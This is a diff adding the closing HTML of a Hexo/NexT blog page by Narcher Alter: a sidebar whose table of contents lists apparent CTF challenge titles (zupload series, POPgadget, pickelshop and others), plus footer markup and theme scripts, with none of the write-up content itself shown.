+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#zupload%E7%B3%BB%E5%88%97"><span class="nav-number">1.</span> <span class="nav-text">zupload系列</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#zupload"><span class="nav-number">1.1.</span> <span class="nav-text">zupload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#zupload-pro"><span class="nav-number">1.2.</span> <span class="nav-text">zupload-pro</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#zupload-pro-plus"><span class="nav-number">1.3.</span> <span class="nav-text">zupload-pro-plus</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#zupload-pro-plus-enhanced"><span class="nav-number">1.4.</span> <span class="nav-text">zupload-pro-plus-enhanced</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#zupload-pro-plus-max"><span class="nav-number">1.5.</span> <span class="nav-text">zupload-pro-plus-max</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#zupload-pro-plus-max-ultra"><span class="nav-number">1.6.</span> <span class="nav-text">zupload-pro-plus-max-ultra</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#zupload-pro-plus-max-ultra-premium"><span class="nav-number">1.7.</span> <span class="nav-text">zupload-pro-plus-max-ultra-premium</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#zupload-pro-revenge"><span class="nav-number">1.8.</span> <span class="nav-text">zupload-pro-revenge</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sql%E6%95%99%E5%AD%A6%E5%B1%80"><span class="nav-number">2.</span> <span class="nav-text">sql教学局</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POPgadget"><span class="nav-number">3.</span> <span class="nav-text">POPgadget</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pickelshop"><span class="nav-number">4.</span> <span class="nav-text">pickelshop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#readbooks"><span class="nav-number">5.</span> <span class="nav-text">readbooks</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#King"><span class="nav-number">6.</span> <span class="nav-text">King</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Narcher Alter</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Narcher Alter</span>
+</div>
+<!--
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+-->
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
